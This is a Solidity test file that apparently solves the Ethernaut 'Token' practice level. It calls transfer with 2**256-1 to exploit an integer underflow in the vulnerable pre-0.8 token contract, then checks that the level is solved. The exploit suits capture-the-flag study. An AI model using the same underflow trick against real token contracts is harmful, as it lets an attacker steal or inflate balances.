// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {DSEthernautTest} from "./utils/DSEthernautTest.sol";
import {console} from "forge-std/console.sol";
import {TokenFactory} from "../src/factories/TokenFactory.sol";
import {Token} from "../src/levels/Token.sol";

contract TokenTest is DSEthernautTest {
    function setUpLevel() public override {
	TokenFactory factory = new TokenFactory();
	ethernaut.registerLevel(factory);
	levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveToken() public {
	Token token = Token(payable(levelAddress));
	vm.startPrank(address(this));
	token.transfer(levelAddress, (2 ** 256) - 1);
	vm.stopPrank();
	assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }

    receive() external payable {}
}
